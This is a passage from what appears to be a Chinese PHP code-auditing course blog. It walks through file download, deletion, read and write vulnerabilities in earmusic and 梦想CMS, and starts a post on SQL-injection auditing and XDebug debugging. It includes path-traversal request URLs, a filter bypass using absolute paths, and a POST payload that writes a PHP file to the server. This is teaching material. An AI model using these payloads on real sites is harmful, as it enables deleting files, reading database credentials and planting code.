src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328142230907.png" alt="image-20230328142230907"></p><p>而delfile方法里面说明path值里面有这四个关键字里面的才会让你删除</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328142744593.png" alt="image-20230328142744593"></p><p>构造payload删除安装文件成功</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328142810358.png" alt="image-20230328142810358"></p><h4 id="文件安全-文件下载-功能点定位-earmusic"><a href="#文件安全-文件下载-功能点定位-earmusic" class="headerlink" title="#文件安全-文件下载-功能点定位-earmusic"></a>#文件安全-文件下载-功能点定位-earmusic</h4><h6 id="1、功能点挖掘-抓包分析下载地址找到对应代码块，文件下载地址由-file控制"><a href="#1、功能点挖掘-抓包分析下载地址找到对应代码块，文件下载地址由-file控制" class="headerlink" title="1、功能点挖掘-抓包分析下载地址找到对应代码块，文件下载地址由$file控制"></a>1、功能点挖掘-抓包分析下载地址找到对应代码块，文件下载地址由$file控制</h6><h6 id="2、-file从数据库查询语句得知，追踪可更新或更改此类数据，路由规则访问"><a href="#2、-file从数据库查询语句得知，追踪可更新或更改此类数据，路由规则访问" class="headerlink" title="2、$file从数据库查询语句得知，追踪可更新或更改此类数据，路由规则访问"></a>2、$file从数据库查询语句得知，追踪可更新或更改此类数据，路由规则访问</h6><h6 id="3、尝试修改发现过滤，追踪过滤机制分析绕过，正则过滤，采用全路径地址绕过"><a href="#3、尝试修改发现过滤，追踪过滤机制分析绕过，正则过滤，采用全路径地址绕过" class="headerlink" title="3、尝试修改发现过滤，追踪过滤机制分析绕过，正则过滤，采用全路径地址绕过"></a>3、尝试修改发现过滤，追踪过滤机制分析绕过，正则过滤，采用全路径地址绕过</h6><p>因为文件下载没有特定的函数，所以只能找功能点</p><p>点击下载url跳转到如下</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328125227873.png" alt="image-20230328125227873"></p><p>发现这里是用sql语句通过查询id序号来调出对应的文件</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328130834582.png" alt="image-20230328130834582"></p><p>翻到下面看到$file变量，说明下载什么文件由file决定，找到file第一次出现的地方，发现它是通过上面的sql语句的方法调用文件的</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328131055565.png" alt="image-20230328131055565"></p><p>先跟踪下这个geturl方法，发现是组合完整的url地址的功能，没有什么特别发现</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328131349964.png" alt="image-20230328131349964"></p><p>再跟踪下方法里面的$row,再次回到它的第一次出现的地方，这里getrow方法是执行sql语句功能的</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328131451416.png" alt="image-20230328131451416"></p><p>在数据库中查找到执行这条语句的表，发现in_audio就是对应的文件名，而id就是文件的序号，所以可以知道in_audio这个值代表的是文件</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328133259555.png" alt="image-20230328133259555"></p><p>全局搜索in_audio，发现add.php文件的这个“音频地址”是控制这个变量的，所以去这个add.php文件操作它</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328133611574.png" alt="image-20230328133611574"></p><p>找到这个地方后，写个1.php（这个1.php是里面有的文件，需要填写要查看的文件）</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328134131407.png" alt="image-20230328134131407"></p><p>找到这个文件后进行下载，读取到了内容</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328134301501.png" alt="image-20230328134301501"></p><p>尝试去下载配置文件</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328134400258.png" alt="image-20230328134400258"></p><p>发现路径变成了Safety filter，被过滤了..&#x2F;</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328134446156.png" alt="image-20230328134446156"></p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328134601411.png" alt="image-20230328134601411"></p><p>写绝对路径即可绕过</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328134746684.png" alt="image-20230328134746684"></p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328134805061.png" alt="image-20230328134805061"></p><h4 id="CNVD拿1DAY-删除-amp-读取-amp-写入-梦想CMS"><a href="#CNVD拿1DAY-删除-amp-读取-amp-写入-梦想CMS" class="headerlink" title="#CNVD拿1DAY-删除&amp;读取&amp;写入-梦想CMS"></a>#CNVD拿1DAY-删除&amp;读取&amp;写入-梦想CMS</h4><h5 id="1、文件删除："><a href="#1、文件删除：" class="headerlink" title="1、文件删除："></a>1、文件删除：</h5><p>admin.php?m&#x3D;Backdb&amp;a&#x3D;delbackdb&amp;filename&#x3D;..&#x2F;..&#x2F;1.txt</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328104013658.png"></p><p>到这个文件下搜索关键字unlink，跟踪一下这个delOne方法看看谁调用了它</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328104915561.png" alt="image-20230328104915561"></p><p>找到了两处调用，这里看第一处即可，没有任何过滤，直接输入文件名即可删除</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328105413874.png" alt="image-20230328105413874"></p><p>刚才的delOne代码中删除的是默认路径file&#x2F;back下的，我们尝试去删除这个Install_ok.txt网站，删除后会重装网站这里可以发现file和install目录是同一级目录</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328105646053.png" alt="image-20230328105646053"></p><p>构造路径删除，删除成功</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328110016169.png" alt="image-20230328110016169"></p><p>再次访问install会重新安装</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328110054006.png" alt="image-20230328110054006"></p><h5 id="2、文件读取和写入："><a href="#2、文件读取和写入：" class="headerlink" title="2、文件读取和写入："></a>2、文件读取和写入：</h5><p><code>admin.php?m=Template&amp;a=editfile&amp;dir=../index.php</code></p><p><code>admin.php?m=template&amp;a=editfile&amp;dir=../</code></p><p><code>settemcontent=1&amp;temcontent=&lt;?php phpinfo();?&gt;&amp;filename=1.php</code></p><p>虽然没有指定哪个文件，但是通过这个低危可以判断是存在后台</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328110214794.png" alt="image-20230328110214794"></p><p>先看一下php读取文件的函数有哪些，进行搜索关键字</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328110711681.png" alt="image-20230328110711681"></p><p>这里搜索file_get_contents</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328111014523.png" alt="image-20230328111014523"></p><p>点击进去跳转到这里</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328111154472.png" alt="image-20230328111154472"></p><p>追踪函数被哪个调用，这里点转到”实现“没有反应，所以点查找使用</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328111505370.png" alt="image-20230328111505370"></p><p>找到对应代码</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328111538511.png" alt="image-20230328111538511"></p><p>观察到</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328112027132.png" alt="image-20230328112027132"></p><p>这里不知道”.$dir“前面的是什么路径通过echo处文件的路径，发现前面的config[‘template’]原来是template目录的意思，例如：config[‘template’].abc意思是template&#x2F;abc</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328112316154.png" alt="image-20230328112316154"></p><p>尝试读取db.inc.php文件内容</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328123534170.png" alt="image-20230328123534170"></p><p>这里还有一个漏洞是写入</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328123657725.png" alt="image-20230328123657725"></p><p>跟随这个put方法，发现了调用了写入函数file_put_contents</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328123919688.png" alt="image-20230328123919688"></p><p>在这个编辑里面添加1111</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328123735850.png" alt="image-20230328123735850"></p><p>在代码里面已经被修改了</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328123802622.png" alt="image-20230328123802622"></p><p>还可以另外创建一个新的文件写入内容，因为这个editfile方法里面post提交settemcontent参数的值，如果有这个参数值，那么可以执行修改的功能，构造payload，以post方式提交</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328124507001.png" alt="image-20230328124507001"></p><p>这个temcontent是提交内容的参数</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328124656690.png" alt="image-20230328124656690"></p><p>写入成功</p><p><img src="/../images/Day82-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8A%E4%BC%A0-%E5%8C%85%E5%90%AB-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96%E7%AD%89/image-20230328124535750.png" alt="image-20230328124535750"></p><h5 id="3、文件上传："><a href="#3、文件上传：" class="headerlink" title="3、文件上传："></a>3、文件上传：</h5><p>找上传点，文件类型后缀设置添加通过</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day81 代码审计-PHP项目&amp;MVC注入&amp;CNVD拿1day&amp;SQL监控&amp;动态调试</title>
      <link href="/2023/03/26/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
      <url>/2023/03/26/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/pagUZrMkLIiCfPwuBasyJA.pngw=1280&h=2355.png" alt="img"></p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/SUyrKNkESntMtTZoJF_1ug.png" alt="img"></p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/tEzlWxoeP5g-Do36-hzyUg.png" alt="img"></p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/svV2OifqoKkYl-SeD_t23A.png" alt="img"></p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/AKvGYf35Uwjg6E6zW4VViw.png" alt="img"></p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/yxdj-PHnHu4asgWDfVZcWg.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、审计漏洞-SQL数据库注入挖掘</p><p>1、审计思路-正则搜索&amp;功能追踪&amp;辅助工具</p><p>3、审计类型-常规架构&amp;MVC架构&amp;三方框架</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><h3 id="简要点："><a href="#简要点：" class="headerlink" title="#简要点："></a>#简要点：</h3><p>1、代码审计必备知识点：</p><p>环境搭建使用，工具插件安装使用，掌握各种漏洞原理及利用,代码开发类知识点。</p><p>2、代码审计开始前准备：</p><p>审计目标的程序名，版本，当前环境(系统,中间件,脚本语言等信息),各种插件等。</p><p>3、代码审计挖掘漏洞根本：</p><p>可控变量及特定函数，不存在过滤或过滤不严谨存在绕过导致的安全漏洞。</p><p>4、代码审计教学计划：</p><p>审计项目漏洞原理-&gt;审计思路-&gt;完整源码-&gt;应用框架-&gt;验证并利用漏洞。</p><p>5、代码审计教学内容：</p><p>PHP,Java,.NET,Python网站应用，引入框架类开发源码，相关审计工具及插件使用。</p><h3 id="补充点："><a href="#补充点：" class="headerlink" title="#补充点："></a>#补充点：</h3><p>-MVC模型：见上图</p><p>当访问动态网页时，以MVC框架为例，浏览器提交查询到控制器（①），如是动态请求，控制器将对应sql查询送到对应模型（②），由模型和数据库交互得到查询结果返回给控制器（③），最后返回给浏览器（④）。</p><h5 id="动态调试配置：phpStudy-PhpStorm-XDebug"><a href="#动态调试配置：phpStudy-PhpStorm-XDebug" class="headerlink" title="-动态调试配置：phpStudy + PhpStorm + XDebug"></a>-动态调试配置：phpStudy + PhpStorm + XDebug</h5><p><a href="https://blog.csdn.net/nzjdsds/article/details/100114242">https://blog.csdn.net/nzjdsds/article/details/100114242</a></p><p>1、先确定PHP版本有Xdebug扩展</p><p>2、php.ini配置写入并开启Xdebug</p><p>3、PhpStorm设置端口及IDEY并测试</p><p>4、PhpStorm开启监听并运行断点访问</p><p>在name处断点</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230328093710653.png" alt="image-20230328093710653"></p><p>点这个强制步入可以一直跟踪name的值执行流程和值的变化</p><p><img src="/../images/Day81-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-MVC%E6%B3%A8%E5%85%A5-CNVD%E6%8B%BF1day-SQL%E7%9B%91%E6%8E%A7-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20230328093903019.png" alt="image-20230328093903019"></p><h5 id="文件代码比对工具：Beyond-Compare-4"><a href="#文件代码比对工具：Beyond-Compare-4" class="headerlink" title="-文件代码比对工具：Beyond Compare 4"></a>-文件代码比对工具：Beyond Compare 4</h5><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ 数据库监控-QQ业务源码系统-(无过滤)</p><p>​                ➢ 正则表达式-Bluecms源码系统-(无过滤)</p><p>​                ➢ CNVD拿1DAY-梦想CMS源码系统-(有过滤)</p></blockquote><p><strong>代码审计：</strong></p><p><strong>1、搜索相关可能存在漏洞的函数</strong></p><p><strong>2、功能点下手分析代码</strong></p><h4 id="数据库监控-QQ业务源码系统-无过滤"><a 